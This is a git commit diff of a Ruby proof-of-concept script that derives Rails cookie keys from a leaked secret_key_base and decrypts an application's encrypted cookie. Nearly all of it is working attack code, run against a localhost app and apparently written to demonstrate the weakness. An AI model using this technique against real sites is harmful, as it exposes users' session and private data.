7ce40d5e285dcadad1d428c1f7f4b277f11aa474
Andres Sarnari <asarnari@Andress-MacBook-Pro.local>
2018-03-08 15:57:04 +1100

    Successfully attack encrypted cookies

--- attack_encrypted_cookies.rb
+++ attack_encrypted_cookies.rb
@@ -7,9 +7,9 @@ require 'cgi'
 require 'active_support/all'
 
 LEAKED_BASE_SECRET = 'cdc8441f641f565e967a0786bd31c50be6e7ea790e17c26ab7083bcb00d9a301c86dcd89c9d8585471a6c28322238682b6f2b4dc79cd4aab8a2627961faed43a'.freeze
-# I think this value can be configured, if you can you'd have to go out of your
-# way to do so
+# The two cookie salts can be configured
 DEFAULT_ENCRYPTED_COOKIE_SALT = 'encrypted cookie'.freeze
+DEFAULT_ENCRYPTED_SIGNED_COOKIE_SALT = 'signed encrypted cookie'.freeze
 # This value can't be configured, it's hardcoded in the Rails source
 RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS = 1000
 
@@ -20,13 +20,28 @@ def encrypted_cookie(url)
   cookie_fields = response.get_fields('set-cookie')
   signed_cookie = cookie_fields.find do |cookie_field|
     cookie_key = cookie_field.split('=')[0]
-    cookie_key == 'signed'
+    cookie_key == 'encrypted'
   end
 
   value_start_index = signed_cookie.index('=') + 1
   value_end_index = signed_cookie.index(';') - 1
   encoded_value = signed_cookie[value_start_index..value_end_index]
-  CGI::unescape(encoded_value)
+  CGI.unescape(encoded_value)
 end
 
-p encrypted_cookie('http://localhost:3000/set-cookies')
+key_generator = ActiveSupport::KeyGenerator.new(
+  LEAKED_BASE_SECRET,
+  iterations: RAILS_HARDCODED_KEY_GENERATOR_ITERATIONS
+)
+encryption_secret = key_generator.generate_key(DEFAULT_ENCRYPTED_COOKIE_SALT)[0, ActiveSupport::MessageEncryptor.key_len]
+sign_secret = key_generator.generate_key(DEFAULT_ENCRYPTED_SIGNED_COOKIE_SALT)
+
+encryptor = ActiveSupport::MessageEncryptor.new(
+  encryption_secret,
+  sign_secret,
+  digest: 'SHA1',
+  serializer: ActiveSupport::MessageEncryptor::NullSerializer
+)
+
+cookie = encrypted_cookie('http://localhost:3000/set-cookies')
+p encryptor.decrypt_and_verify(cookie)
